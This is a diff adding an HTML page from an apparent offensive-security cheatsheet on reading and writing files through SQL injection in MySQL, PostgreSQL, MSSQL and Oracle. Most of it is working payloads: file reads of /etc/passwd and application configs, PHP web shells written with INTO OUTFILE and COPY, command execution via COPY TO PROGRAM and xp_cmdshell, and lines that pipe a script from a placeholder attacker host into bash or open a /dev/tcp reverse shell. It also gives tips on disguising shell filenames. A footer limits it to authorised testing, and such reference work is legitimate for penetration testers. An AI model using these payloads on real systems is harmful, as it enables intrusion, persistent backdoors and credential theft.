@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLi File Operations · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>SQLi File Operations</h1><p class="cx-lede">Reading and writing files on the database host via SQL injection.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1005, T1059</span><span class="cx-tag">D3FEND D3-MH, D3-EI, D3-FA</span><span class="cx-tag">IMPACT FileRead, FileWrite, RCE</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>When the database account has appropriate privileges, SQL injection can read arbitrary files from the database server's filesystem and, in some cases, write files - including web shells.</p>
+<div class="cx-aside cx-danger">
+<p class="cx-aside-title">Danger</p>
+<p>File write and command execution are loud, attributable, and often illegal outside authorised testing. Confirm authorisation and impact before reaching for these techniques.</p>
+</div>
+<h2 id="tldr">TL;DR</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Read file
+&#x27; UNION SELECT NULL, LOAD_FILE(&#x27;/etc/passwd&#x27;), NULL-- -
+
+-- Write web shell (legacy, often blocked)
+&#x27; UNION SELECT &#x27;&lt;?php system($_GET[&quot;c&quot;]); ?&gt;&#x27;, NULL, NULL INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Read file (superuser)
+&#x27; UNION SELECT NULL, pg_read_file(&#x27;/etc/passwd&#x27;, 0, 100000), NULL-- -
+
+-- Command execution via COPY
+&#x27;; COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;id &gt; /tmp/out&#x27;-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Command execution via xp_cmdshell
+&#x27;; EXEC master..xp_cmdshell &#x27;whoami&#x27;-- -</code></pre></figure>
+</div>
+</div>
+<h2 id="privilege-requirements">Privilege requirements</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Read files</th>
+<th>Write files</th>
+<th>RCE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>FILE</code> privilege + <code>secure_file_priv</code> permits target dir</td>
+<td><code>FILE</code> privilege + <code>secure_file_priv</code> permits target dir + path is web-served</td>
+<td>Generally not possible directly; via UDF if <code>plugin_dir</code> writable</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>Superuser (or <code>pg_read_server_files</code> role in 11+)</td>
+<td>Superuser</td>
+<td>Superuser via <code>COPY ... TO PROGRAM</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>xp_dirtree</code> / <code>xp_fileexist</code> (sysadmin or specific perms)</td>
+<td><code>xp_cmdshell</code> (sysadmin)</td>
+<td><code>xp_cmdshell</code> (sysadmin)</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>JAVA IO PERMISSION</code>, <code>UTL_FILE</code> (DBA)</td>
+<td><code>UTL_FILE</code> (DBA)</td>
+<td><code>DBMS_SCHEDULER</code> / Java (DBA)</td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Always check current privileges first - most injection points run as a low-privilege application user. Don't waste time on file write payloads against an unprivileged DB account.</p>
+</div>
+<h2 id="mysql-file-operations">MySQL file operations</h2>
+<h3 id="check-file-privilege">Check <code>FILE</code> privilege</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL, GROUP_CONCAT(privilege_type), NULL FROM information_schema.user_privileges-- -
+&#x27; UNION SELECT NULL, current_user(), NULL-- -</code></pre></figure>
+<p>Look for <code>FILE</code> in the privilege list.</p>
+<h3 id="check-secure_file_priv">Check <code>secure_file_priv</code></h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL, @@secure_file_priv, NULL-- -</code></pre></figure>
+<p>Possible values:
+- <code>NULL</code> → file ops disabled entirely.
+- <code>''</code> (empty) → reads/writes allowed anywhere.
+- <code>/some/path/</code> → reads/writes restricted to that directory.</p>
+<h3 id="read-file">Read file</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL, LOAD_FILE(&#x27;/etc/passwd&#x27;), NULL-- -
+&#x27; UNION SELECT NULL, LOAD_FILE(&#x27;/var/www/html/config.php&#x27;), NULL-- -
+&#x27; UNION SELECT NULL, LOAD_FILE(&#x27;C:/Windows/System32/drivers/etc/hosts&#x27;), NULL-- -</code></pre></figure>
+<p><code>LOAD_FILE()</code> returns NULL if:
+- File doesn't exist
+- File is larger than <code>max_allowed_packet</code> (default 64MB but historically 1MB)
+- MySQL process can't read it (permissions)
+- <code>secure_file_priv</code> blocks the path</p>
+<h3 id="write-file">Write file</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT &#x27;&lt;?php system($_GET[0]); ?&gt;&#x27;, NULL, NULL INTO OUTFILE &#x27;/var/www/html/x.php&#x27;-- -</code></pre></figure>
+<p>Constraints:
+- The number of <code>SELECT</code>ed values must match the column count.
+- The target file must not exist (no overwrite).
+- <code>secure_file_priv</code> must permit the path.
+- MySQL process needs filesystem write access to that path.</p>
+<p>To write to a path with a known column count:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT &#x27;&lt;?php system($_GET[0]); ?&gt;&#x27;,2,3,4 INTO OUTFILE &#x27;/var/www/html/x.php&#x27;-- -</code></pre></figure>
+<p>For binary content, or payloads whose quotes/newlines break the injection, wrap the data with <code>FROM_BASE64()</code> so only base64 characters travel in the query:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT FROM_BASE64(&#x27;PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=&#x27;),2,3,4 INTO OUTFILE &#x27;/var/www/html/x.php&#x27;-- -</code></pre></figure>
+<p>For an exact binary (a compiled UDF <code>.so</code>, an image-polyglot shell), use <code>INTO DUMPFILE</code>, which writes bytes verbatim with no row or column formatting. Two constraints that bite if you just swap the keyword into the example above:</p>
+<ul>
+<li><strong>DUMPFILE writes exactly one row.</strong> The injected <code>UNION</code> row plus any rows the original query returns is more than one, which errors. Make the base query match nothing (inject a value with no results) and add <code>LIMIT 1</code>.</li>
+<li><strong>It concatenates every selected column with no separator.</strong> The <code>2,3,4</code> padding would become literal bytes in the file. Select the payload in one column and leave the rest empty (<code>''</code>), which contribute nothing.</li>
+</ul>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">nonexistent&#x27; UNION SELECT FROM_BASE64(&#x27;&lt;b64&gt;&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27; LIMIT 1 INTO DUMPFILE &#x27;/tmp/x.so&#x27;-- -</code></pre></figure>
+<p>When the web root path is unknown, common locations:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/var/www/html/                  (Debian/Ubuntu Apache default)
+/var/www/                       (older default)
+/srv/http/                      (Arch / BlackArch)
+/usr/share/nginx/html/          (Nginx)
+/inetpub/wwwroot/               (IIS)</code></pre></figure>
+<h2 id="postgresql-file-operations">PostgreSQL file operations</h2>
+<h3 id="read-file_1">Read file</h3>
+<p>Superuser only (or <code>pg_read_server_files</code> role in PG 11+):</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT NULL, pg_read_file(&#x27;/etc/passwd&#x27;, 0, 100000), NULL-- -</code></pre></figure>
+<p>For binary files use <code>pg_read_binary_file()</code>.</p>
+<h3 id="write-file-via-copy">Write file via <code>COPY</code></h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; COPY (SELECT &#x27;&lt;?php system($_GET[0]); ?&gt;&#x27;) TO &#x27;/var/www/html/x.php&#x27;-- -</code></pre></figure>
+<p>Requires stacked queries and superuser.</p>
+<h3 id="rce-via-copy-to-program">RCE via <code>COPY ... TO PROGRAM</code></h3>
+<p>PostgreSQL 9.3+ allows <code>COPY</code> to pipe data to/from a shell command:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;id &gt; /tmp/out&#x27;-- -
+&#x27;; COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;curl http://&lt;ATTACKER&gt;/sh | bash&#x27;-- -
+&#x27;; COPY (SELECT &#x27;&#x27;) TO PROGRAM &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER&gt;/4444 0&gt;&amp;1&quot;&#x27;-- -</code></pre></figure>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>This is the most reliable PostgreSQL → RCE path when you have superuser. Always try <code>COPY ... TO PROGRAM</code> before more exotic techniques.</p>
+</div>
+<h3 id="rce-via-extension-creation">RCE via extension creation</h3>
+<p>If <code>COPY ... TO PROGRAM</code> is restricted but you have superuser, dynamic library loading is sometimes possible - depends heavily on PG configuration and beyond this page's scope.</p>
+<h2 id="mssql-file-operations">MSSQL file operations</h2>
+<h3 id="enable-and-use-xp_cmdshell">Enable and use <code>xp_cmdshell</code></h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Enable advanced options
+&#x27;; EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE-- -
+
+-- Enable xp_cmdshell
+&#x27;; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE-- -
+
+-- Run a command
+&#x27;; EXEC master..xp_cmdshell &#x27;whoami&#x27;-- -
+
+-- Get output (when reflected)
+&#x27; UNION SELECT NULL, output, NULL FROM (SELECT * FROM OPENROWSET(&#x27;SQLNCLI&#x27;, &#x27;server=.;trusted_connection=yes&#x27;, &#x27;set fmtonly off; exec master..xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;)) AS t-- -</code></pre></figure>
+<p>When output isn't reflected, redirect:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; EXEC master..xp_cmdshell &#x27;whoami &gt; C:\inetpub\wwwroot\out.txt&#x27;-- -</code></pre></figure>
+<p>Then <code>GET /out.txt</code>.</p>
+<h3 id="read-file_2">Read file</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; EXEC master..xp_cmdshell &#x27;type C:\path\to\file.txt&#x27;-- -
+
+-- Or via BULK INSERT
+&#x27; UNION SELECT NULL, BulkColumn, NULL FROM OPENROWSET(BULK &#x27;C:\path\to\file.txt&#x27;, SINGLE_CLOB) AS t-- -</code></pre></figure>
+<h3 id="check-directory-contents">Check directory contents</h3>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; EXEC master..xp_dirtree &#x27;C:\&#x27;, 1, 1-- -</code></pre></figure>
+<h2 id="oracle-file-operations">Oracle file operations</h2>
+<p>Oracle file operations require DBA privileges and are rarely available via injection. Brief reference:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Read file via UTL_FILE (DBA)
+SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN(&#x27;DIR_OBJECT&#x27;, &#x27;file.txt&#x27;, &#x27;R&#x27;), buffer) FROM dual;
+
+-- Java-based command execution (DBA, complex)
+-- Generally requires deploying a Java class - out of scope for casual exploitation</code></pre></figure>
+<p>For Oracle, focus on data extraction and use other vectors (network services, weak credentials) for code execution.</p>
+<h2 id="web-shell-drop-workflow">Web shell drop workflow</h2>
+<p>When you can write files and the path is web-served:</p>
+<div class="cx-steps">
+<ol>
+<li><strong>Confirm web root</strong> - read <code>index.php</code> or <code>index.html</code> via <code>LOAD_FILE</code> to confirm the path is correct.</li>
+<li><strong>Drop minimal shell</strong> - keep it small to reduce filter risk:</li>
+</ol>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php system($_GET[0]); ?&gt;</code></pre></figure>
+<ol start="3">
+<li><strong>Verify via HTTP</strong>:</li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GET /x.php?0=id</code></pre></figure>
+<ol start="4">
+<li><strong>Upgrade to reverse shell</strong> - once command exec works, fetch a real reverse shell:</li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GET /x.php?0=curl%20http://&lt;ATTACKER&gt;/sh%20|%20bash</code></pre></figure>
+</div>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Filename tips: avoid obvious names (<code>shell.php</code>, <code>cmd.php</code>) - some apps scan the web root. Use innocuous names mimicking the application: <code>assets.php</code>, <code>helper.php</code>, <code>cache.php</code>.</p>
+</div>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong><code>LOAD_FILE</code> returns NULL</strong> - privilege missing, path wrong, file too large, or <code>secure_file_priv</code> blocking. Check each in order.</li>
+<li><strong><code>INTO OUTFILE</code> errors with "Can't create"</strong> - target directory not writable by MySQL process or <code>secure_file_priv</code> restriction.</li>
+<li><strong><code>xp_cmdshell</code> returns "SQL Server blocked access"</strong> - disabled in configuration; enable via <code>sp_configure</code> (requires sysadmin).</li>
+<li><strong><code>COPY ... TO PROGRAM</code> returns "must be superuser"</strong> - current PG user is not superuser. Try escalating via known PG CVEs or stop here.</li>
+<li><strong>Web shell uploaded but not executable</strong> - server doesn't parse the extension as PHP. Try <code>.phtml</code>, <code>.php5</code>, <code>.phar</code>, or move to a directory with PHP execution enabled.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>File operations are the bridge from "I have SQLi" to "I have a shell on the database server." This is often the most impactful finding in a report.</li>
+<li>Reading <code>/etc/passwd</code> proves file read but isn't actionable. Pivot to reading the application's config (DB credentials, API keys, session secrets, private keys) for further compromise.</li>
+<li>On Windows, prefer reading <code>C:\Windows\System32\config\SAM</code> and <code>SECURITY</code> only if you have SYSTEM-level read access, which is unusual via DB injection. More realistic targets: web.config, application config, IIS logs.</li>
+<li>Writing files is louder than reading - every web shell drop is a clear backdoor that triggers AV/EDR. In real engagements, weigh the noise vs. the goal.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../nosql/index.html">Previous: NoSQL Injection</a><a class="cx-next" href="../bypasses/index.html">Next: SQLi Filter &amp; WAF Bypasses</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
